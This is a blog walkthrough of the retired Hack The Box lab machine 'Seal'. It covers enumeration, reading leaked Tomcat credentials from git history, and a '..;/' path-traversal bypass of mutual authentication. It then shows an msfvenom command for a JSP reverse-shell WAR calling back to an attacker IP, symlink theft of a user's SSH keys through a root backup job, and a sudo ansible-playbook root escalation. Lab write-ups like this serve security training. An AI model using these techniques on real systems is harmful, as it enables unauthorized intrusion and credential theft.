---
layout: single
title: "Walktrough: HTB Seal"
namespace: htb-seal
category: Walkthrough
tags:
  - HackTheBox
  - HTB Medium
  - HTB Linux
date: 2021-07-03 16:00:00
header:
   teaser: https://i.imgur.com/XCdEMkt.png
---

Hello guys!

This week's machine will be **Seal**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [MrR3boot](https://app.hackthebox.eu/users/13531)<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Seal](https://i.imgur.com/meex9Q8.png){: .align-center}

add **Comment**

## Enumeration

As usual, started with a `nmap` quick scan to enumerate all published services in this box

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.250                                                                                       Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.                                 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 19:42 -03
Nmap scan report for 10.10.10.250
Host is up (0.073s latency).                                                                                                     Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Tue, 17 Aug 2021 22:42:11 GMT
|     Set-Cookie: JSESSIONID=node0j1gzs3ei5rao7l9ijuqxq2o553232.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Tue, 17 Aug 2021 22:42:10 GMT
|     Set-Cookie: JSESSIONID=node05g64q3ap6c5nwizqtdhsdxpn53230.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Tue, 17 Aug 2021 22:42:10 GMT
|     Set-Cookie: JSESSIONID=node0l8mj499siry21w794qqzy5ofd53231.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck:
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest:
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4:
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5:
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=8/17%Time=611C3B48%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F7,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Tue,\x2017\x2
SF:0Aug\x202021\x2022:42:10\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node05g64q
SF:3ap6c5nwizqtdhsdxpn53230\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20
SF:Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/h
SF:tml;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,10C,"
SF:HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2017\x20Aug\x202021\x2022:42:1
SF:0\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0l8mj499siry21w794qqzy5ofd532
SF:31\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201
SF:970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nA
SF:llow:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20
SF:Version</pre>")%r(FourOhFourRequest,F7,"HTTP/1\.1\x20401\x20Unauthorize
SF:d\r\nDate:\x20Tue,\x2017\x20Aug\x202021\x2022:42:11\x20GMT\r\nSet-Cooki
SF:e:\x20JSESSIONID=node0j1gzs3ei5rao7l9ijuqxq2o553232\.node0;\x20Path=/;\
SF:x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\
SF:n\r\n")%r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0
SF:x5\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\
SF:x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre
SF:>reason:\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/
SF:1\.1\x20400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20tex
SF:t/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20cl
SF:ose\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20cha
SF:racter\x20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x
SF:20character\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-885
SF:9-1\r\nContent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20
SF:Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</
SF:pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.10 seconds
```

As observed in the `nmap` scan, port 443/TCP runs an HTTPS service with a certificate issued to `seal.htb`. This entry was added to my local hosts file to make easier enumeration

### 443/TCP - HTTP Service

Accessing the website, we notice a vegetable shop website in a single page application, as below

![HTB Seal - HTTPS Website](https://i.imgur.com/y5wtEp3.png){: .align-center}

Inspecting the references using `curl` we can't see anything useful as well.

```bash
$ curl -L https://10.10.10.250 -k | grep -Eo 'href=".*"|src=".*"' | awk -F" " '{print $1}' | awk -F"\"" '{print $2}' | sort -u   [1/1534]  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
Dload  Upload   Total   Spent    Left  Speed
100 19737  100 19737    0     0  53343      0 --:--:-- --:--:-- --:--:-- 53199
#
#about
#contact
css/bootstrap.min.css
css/jquery.mCustomScrollbar.min.css
css/responsive.css
css/style.css
https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css
https:cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js
https://maps.googleapis.com/maps/api/js?key=AIzaSyA8eaHt9Dh5H57Zh0xVTqxVdBFCvFMqFjQ&callback=initMap
https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css
https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js
https://oss.maxcdn.com/respond/1.4.2/respond.min.js
images/about.jpg
images/fevicon.png
images/img2.png
images/loading.gif
images/tes.jpg
images/test_con.png
images/v1.jpg
images/v2.jpg
index.html
Javascript:void(0)
js/bootstrap.bundle.min.js
js/custom.js
js/jquery-3.0.0.min.js
js/jquery.mCustomScrollbar.concat.min.js
js/jquery.min.js
js/plugin.js
js/popper.min.js
#myCarousel
#testimonial
#vegetable
```

Inspecting the website using `whatweb` we can confirm what we expected based on the existing references, a simple application, with some known components but nothing that could point to a known CMS platform.

```bash
$ whatweb https://10.10.10.250
https://10.10.10.250 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[admin@seal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.10.250], JQuery[3.0.0], Script, Title[Seal Market], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Checking for other directories, started a `gobuster dir` enumeration, where I found some directories

```bash
$ gobuster dir -u https://seal.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ./gobuster.txt -x html,txt,php -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://seal.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2021/08/18 12:08:13 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> http://seal.htb/images/]
/index.html           (Status: 200) [Size: 19737]
/15                   (Status: 302) [Size: 0] [--> http://seal.htb/15/]
/admin                (Status: 302) [Size: 0] [--> http://seal.htb/admin/]
/icon                 (Status: 302) [Size: 0] [--> http://seal.htb/icon/]
/css                  (Status: 302) [Size: 0] [--> http://seal.htb/css/]
/js                   (Status: 302) [Size: 0] [--> http://seal.htb/js/]
/shell                (Status: 302) [Size: 0] [--> http://seal.htb/shell/]
/manager              (Status: 302) [Size: 0] [--> http://seal.htb/manager/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 813]
/http%3A%2F%2Fwww.html (Status: 400) [Size: 813]
/http%3A%2F%2Fwww.txt (Status: 400) [Size: 813]
/http%3A%2F%2Fwww.php (Status: 400) [Size: 813]
```

Attempting to connect to some of these directories, received some errors, including a "Connection refused" while trying to connect to the manager's website.

```bash
$ curl -I -L https://seal.htb/manager/ -k
HTTP/1.1 302
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 18 Aug 2021 15:47:09 GMT
Content-Type: text/html
Connection: keep-alive
Location: http://seal.htb/manager/html

curl: (7) Failed to connect to seal.htb port 80: Connection refused
```

Probably these URLs are being filtered from unknown IPs, where we should find a way to connect to them later.

### 8080/TCP - Proxy Server

According to `nmap` scan, we have a proxy service running in this TCP port. A quick way to confirm that is to set it as my proxy server, which I've added to Burp Suite so I could keep inspecting the requests made to the server.

![HTB Seal - Burp Upstream Proxy configuration](https://i.imgur.com/Wkk3t0F.png){: .align-center}

While entering the website address to reach out to it using the proxy, by mistake, I have entered the URL missing the HTTPS protocol and surprisingly found a website running in 80/TCP in the host, not available publicly, running a **GitBucket** instance. This confirms that the proxy service is running and will allow us to enumerate the service running locally

![HTB Seal - HTTP Service via Proxy](https://i.imgur.com/evXIne6.png){: .align-center}

### 80/TCP - HTTP Service

Inspecting the webpage using `curl` noticed

```bash
$ curl -L -i -s -k -X $'GET' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36' $'http://seal.htb/' --proxy http://127.0.0.1:8080 | grep -Eo 'href=".*"|src=".*"' | awk -F" " '{print $1}' | awk -F"\"" '{print $2}' | sort -u
/
/assets/common/css/gitbucket.css?20210818044948
/assets/common/images/gitbucket.png?20210818044948
/assets/common/images/gitbucket.svg?20210818044948
/assets/common/js/gitbucket.js?20210818044948
/assets/common/js/validation.js?20210818044948
/assets/vendors/AdminLTE-2.4.2/css/AdminLTE.min.css?20210818044948
/assets/vendors/AdminLTE-2.4.2/css/skins/skin-green.min.css?20210818044948
/assets/vendors/AdminLTE-2.4.2/js/adminlte.min.js?20210818044948
/assets/vendors/bootstrap-3.4.1/css/bootstrap.min.css?20210818044948
/assets/vendors/bootstrap-3.4.1/js/bootstrap.min.js?20210818044948
/assets/vendors/bootstrap3-typeahead/bootstrap3-typeahead.min.js?20210818044948
/assets/vendors/bootstrap-datetimepicker-4.17.44/css/bootstrap-datetimepicker.min.css?20210818044948
/assets/vendors/bootstrap-datetimepicker-4.17.44/js/bootstrap-datetimepicker.min.js?20210818044948
/assets/vendors/bootstrap-datetimepicker-4.17.44/js/moment.min.js?20210818044948
/assets/vendors/colorpicker/css/bootstrap-colorpicker.min.css?20210818044948
/assets/vendors/colorpicker/js/bootstrap-colorpicker.min.js?20210818044948
/assets/vendors/color-themes-for-google-code-prettify/github-v2.min.css?20210818044948
/assets/vendors/dropzone/dropzone.min.js?20210818044948
/assets/vendors/elastic/jquery.elastic.source.js?20210818044948
/assets/vendors/facebox/facebox.css?20210818044948
/assets/vendors/facebox/facebox.js?20210818044948
/assets/vendors/font-awesome-4.7.0/css/font-awesome.min.css?20210818044948
/assets/vendors/google-code-prettify/prettify.js?20210818044948
/assets/vendors/google-fonts/css/source-sans-pro.css?20210818044948
/assets/vendors/jquery-hotkeys/jquery.hotkeys.js?20210818044948
/assets/vendors/jquery/jquery-3.5.1.min.js?20210818044948
/assets/vendors/jquery-textcomplete-1.8.4/jquery.textcomplete.min.js?20210818044948
/assets/vendors/jquery-ui/jquery-ui.min.css?20210818044948
/assets/vendors/jquery-ui/jquery-ui.min.js?20210818044948
/assets/vendors/jquery-ui/jquery-ui.structure.min.css?20210818044948
/assets/vendors/jquery-ui/jquery-ui.theme.min.css?20210818044948
/assets/vendors/octicons-4.4.0/octicons.min.css?20210818044948
/assets/vendors/tipped/tipped.css?20210818044948
/assets/vendors/tipped/tipped.min.js?20210818044948
/gist
/register
/signin?redirect=%2Fsignin%3Bjsessionid%3Dnode01rfgk0wts4q28c8jsgu6bnqpm130.node0
```

Also using `whatweb` identified basically the same components and their versions

```bash
$ whatweb --proxy 127.0.0.1:8080 seal.htb/signin                                                                                 
http://seal.htb/signin [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HttpOnly[JSESSIONID], IP[10.10.10.250], JQuery[3.5.1], Open-Graph-Protocol[object], PasswordField[password], Script[text/javascript], Title[Sign in], X-UA-Compatible[IE=edge]
```

As nothing interesting was found, decided to attempt to create an account, where the following information was used, including adding a URL point to ourselves, in the case of receiving a request

![HTB Seal - GitBucket account creation](https://i.imgur.com/NsME1ay.png){: .align-center}

With the newly created account, started browsing the existing repositories in this server, where found the repositories **Infra** and "**seal_market**", owned by **root**. Also seen, from the dashboard, we can see users `luis` and `alex` commenting on some issues in these repositories

![HTB Seal - GitBucket server news feed](https://i.imgur.com/rYwpG13.png){: .align-center}

Started by inspecting the contents of both repositories, which were cloned to my attacker machine. Important to note that as we're accessing it through a proxy server, we need to add first a configuration to use a proxy server when accessing repositories in the seal.htb domain

```bash
$ git config --global http.http://seal.htb.proxy http://127.0.0.1:8080

$ git clone http://seal.htb/git/root/infra.git
Cloning into 'infra'...
Username for 'http://seal.htb': jdoe
Password for 'http://jdoe@seal.htb':
remote: Counting objects: 15, done
remote: Finding sources: 100% (15/15)
remote: Getting sizes: 100% (13/13)
remote: Compressing objects: 100% (59/59)
remote: Total 15 (delta 1), reused 12 (delta 0)
Unpacking objects: 100% (15/15), 2.42 KiB | 826.00 KiB/s, done.
                                                                                                                                
$ git clone http://seal.htb/git/root/seal_market.git
Cloning into 'seal_market'...
Username for 'http://seal.htb': jdoe
Password for 'http://jdoe@seal.htb':
remote: Counting objects: 161, done
remote: Finding sources: 100% (161/161)
remote: Getting sizes: 100% (132/132)
remote: Compressing objects: 100% (1339/1339)
remote: Total 161 (delta 22), reused 149 (delta 16)
Receiving objects: 100% (161/161), 1.80 MiB | 29.29 MiB/s, done.
Resolving deltas: 100% (22/22), done.
```

Inspecting both repositories, saw the following:

- **root/infra** repository is an Ansible playbook to install and configure tomcat for the web application. Nothing interesting was found on the files and this repository has only two commits.

  - The only relevant information obtained is the Tomcat running version, which is **8.0.61**, based on the content of `./roles/tomcat/tasks/main.yml`, where the binary is downloaded from the following URL

    ```yaml
    - name: Download Tomcat
      get_url: url=http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.61/bin/apache-tomcat-8.0.61.tar.gz dest=/opt/apache-tomcat-8.0.61.tar.gz
    ```

- **root/seal_market** repository contains all configuration files for the app and tomcat and Nginx configuration files. This repository was a little bit more interesting, where the following information was found:

  - Noticed that in `README.md`, at the root of this repository, there are indicators that this app uses Mutual Authentication for some of its features

    ```markdown
    Seal Market App
    ===============
    A simple online market application which offers free shopping, avoid crowd in this pandemic situation, saves time.
    
    ## ToDo
    * Remove mutual authentication for dashboard, setup registration and login features.
    * Deploy updated tomcat configuration.
    * Disable manager and host-manager.
    ```

  - This was confirmed by inspecting Nginx configuration files, where `/manager/html`(Tomcat administration page), `/admin/dashboard` and, that is proxied to 8000/TCP running in the same host, requires `$ssl_client_verify` to be true, returning HTTP error 403 if criteria are not satisfied.

  - Observed also that repository contains **13 commits**, which were quickly inspected to see if there are changes in this repository during credential cleanup without reinitializing git history, which was confirmed by grepping the words `password` and `username` from git log, allowing us to obtain tomcat credentials: **tomcat:42MrHBf*z8{Z%**.

    ```bash
    $ git log -p | grep -E 'username|password'
    +select,textarea,input[type="text"],input[type="password"],input[type="datetime"],input[type="datetime-local"],input[type="date"],input[type="month"],input[type="time"],input[type="week"],input[type="number"],input[type="email"],input[type="url"],input[type="search"],input[type="tel"],input[type="color"],.uneditable-input{display:inline-block;height:20px;padding:4px 6px;margin-bottom:10px;font-size:14px;line-height:20px;color:#555555;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;vertical-align:middle;}
    
    [...]
    
       <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
       <user username="role1" password="<must-be-changed>" roles="role1"/>
    -<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
    +      <!-- Use the LockOutRealm to prevent attempts to guess user passwords
    +  you must define such a user - the username and password are arbitrary. It is
    +  them. You will also need to set the passwords to something appropriate.
    +  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
    +  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
    +  <user username="role1" password="<must-be-changed>" roles="role1"/>
    +<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
    ```

    Accessing tomcat through the path `/manager` we're automatically redirected to `/manager/html`, which is prevented by mutual authentication. Looking for another URL under management console, found in this documentation page [Apache Tomcat 7 (7.0.109) - Manager App HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html) a few other URLs, being `/manager/text` the first one listed, to which I'm not authorized. Trying the second URL found on the same page, which is `/manager/status`, once already authenticated, returned server information but as this is a static page there's nothing to do here.

## Initial Access

Once I have nothing to do on this page, and the RCE most probable will be via Apache Tomcat manager, once we have `manager-gui,admin-gui` privileges, started to try some directory traversal attacks based on [PayloadsAllTheThings/Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) and, testing a bypass with `..;/` I have succeeded on accessing the management console at `https://seal.htb/manager/status/..;/html`.

Once we now have access to the manager console, we can upload a reverse shell payload generated using `msfvenom` as command below

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war > reverse.war
```

:bulb: **Tip**: One important point here is that I needed to intercept all page requests so I could adjust the post request to the path traversal vulnerability found
{: .notice--info}

## User flag

Enumerating this box, now that we have an interactive shell, ran `linpeas.sh`, where these were the findings identified:

- Users with console access:

  ```plaintext
  uid=0(root) gid=0(root) groups=0(root)
  uid=1000(luis) gid=1000(luis) groups=1000(luis)
  ```

- Read access to Nginx logs at `/var/log/nginx/` where we could extract some information from the logs

- Readable backup archives at `/opt/backups/archives/`, created by `luis`

- Web files (possible certificate for mutual auth)

  ```plaintext
  /var/www/:
  total 16K
  drwxr-xr-x  4 root root 4.0K May  7 09:06 .
  drwxr-xr-x 14 root root 4.0K May  7 09:06 ..
  drwxr-xr-x  2 root root 4.0K Jul  5 07:57 html
  drwxr-xr-x  2 root root 4.0K May  7 09:06 keys
  ```

- Interesting files inside `luis` profile

  ```plaintext
  ╔══════════╣ Files inside others home (limit 20)
  grep: /home/luis/.bash_logout
  /home/luis/.cache/fontconfig/7ef2298fde41cc6eeb7af42e48b7d293-le64.cache-7
  /home/luis/.cache/fontconfig/3830d5c3ddfd5cd38a049b759396e72e-le64.cache-7
  /home/luis/.cache/fontconfig/CACHEDIR.TAG
  /home/luis/.cache/fontconfig/4c599c202bc5c08e2d34565a40eac3b2-le64.cache-7
  /home/luis/.cache/fontconfig/d589a48862398ed80a3d6066f4f56f4c-le64.cache-7
  /home/luis/.cache/motd.legal-displayed
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/Servlet.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/Registration$Dynamic.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/ServletRequestWrapper.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/RequestDispatcher.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/ServletResponse.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/ServletContainerInitializer.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/DispatcherType.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/ServletRequestEvent.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/ServletContextAttributeEvent.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/ServletContext.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/HttpConstraintElement.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/ServletOutputStream.class
  /home/luis/.gitbucket/tmp/webapp/javax/servlet/Filter.class
  ```

Starting with the contents inside `/var/www`, where there's a folder called `keys` inside it, noticed that all certificates used for mutual authentication are present but, due to ACL restrictions, I wasn't able to copy the keys, preventing us from obtaining them.

```bash
tomcat@seal:/var/www/keys$ ls -la
total 44
drwxr-xr-x 2 root root 4096 May  7 09:06 .
drwxr-xr-x 4 root root 4096 May  7 09:06 ..
-rw-r--r-- 1 root root 1432 May  5 10:22 selfsigned-ca.crt
-rw------- 1 root root 1708 May  5 10:21 selfsigned-ca.key
-rw-r--r-- 1 root root 1192 May  5 11:03 selfsigned-cli.crt
-rw-r--r-- 1 root root  956 May  5 11:03 selfsigned-cli.csr
-rw------- 1 root root 1679 May  5 11:02 selfsigned-cli.key
-rw------- 1 root root 2437 May  5 11:03 selfsigned-cli.p12
-rw-r--r-- 1 root root 1285 May  5 10:24 selfsigned.crt
-rw-r--r-- 1 root root 1119 May  5 10:23 selfsigned.csr
-rw------- 1 root root 1679 May  5 10:22 selfsigned.key
```

Proceeding to `luis` home directory, we can see that we have a `*.war` file for GitBucket application as well as some caches for GitBucket application, but nothing interesting was found.

```bash
tomcat@seal:/home/luis$ ls -la
total 51320
drwxr-xr-x 9 luis luis     4096 May  7 07:01 .
drwxr-xr-x 3 root root     4096 May  5 12:52 ..
drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -> /dev/null
-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout
-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc
drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache
drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config
drwxrwxr-x 6 luis luis     4096 Aug 18 21:00 .gitbucket
-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java
drwxrwxr-x 3 luis luis     4096 May  5 14:33 .local
-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile
drwx------ 2 luis luis     4096 May  7 06:10 .ssh
-r-------- 1 luis luis       33 Aug 18 21:00 user.txt
```

The last point already identified was the backup files located at `/opt/backups`, where we can see the following files, which were copied over to the attacker machine:

```bash
tomcat@seal:/opt/backups$ find . -type f
./archives/backup-2021-08-18-21:51:33.gz
./archives/backup-2021-08-18-21:50:33.gz
./archives/backup-2021-08-18-21:52:33.gz
./playbook/run.yml
```

Checking the `run.yml` file, we have an Ansible playbook that copies all files in `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` to `/opt/backups/files` and then creates a compressed archive from it.

```yaml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Inspecting the source folder permissions we can see that the `uploads` directory is world-writable (777) and we could add anything inside it to be archived with the remaining contents of `dashboard`.

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
total 100
drwxr-xr-x 7 root root  4096 May  7 09:26 .
drwxr-xr-x 3 root root  4096 May  6 10:48 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7 09:26 uploads
```

An interesting point is a flag `copy_links=yes` added in the `synchronize` task which, according to [synchronize - Ansible Documentation](https://docs.ansible.com/ansible/2.3/synchronize_module.html), it will copy the actual file from the links in the respective directories.

To test this theory, we can attempt to create two links inside the uploads directory, one for `user.txt` flag and the second for `.ssh` from `luis`' profile

```bash
ln -s /home/luis/user.txt /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/user.txt
ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/.ssh
```

One minute later, the

```bash
$ find ./dashboard/uploads -type f
./user.txt
./.ssh/authorized_keys
./.ssh/id_rsa
./.ssh/id_rsa.pub
```

```bash
luis@seal:~$ cat user.txt
<redacted>
```

## Root flag

Now that we're with Luis account, running `sudo -l`

```bash
luis@seal:~/.ansible/tmp$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

According to [ansible playbook | GTFOBins](https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo), we can use

```bash
luis@seal:~/.ansible/tmp$ TF=$(mktemp)
luis@seal:~/.ansible/tmp$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:~/.ansible/tmp$ sudo /usr/bin/ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] **************************************************************************************************************

TASK [Gathering Facts] ********************************************************************************************************
ok: [localhost]

TASK [shell] ******************************************************************************************************************
# id && hostname
uid=0(root) gid=0(root) groups=0(root)
seal
# cat /root/root.txt
<redacted>
# exit
changed: [localhost]

PLAY RECAP *********************************************************************************************************************
localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
```
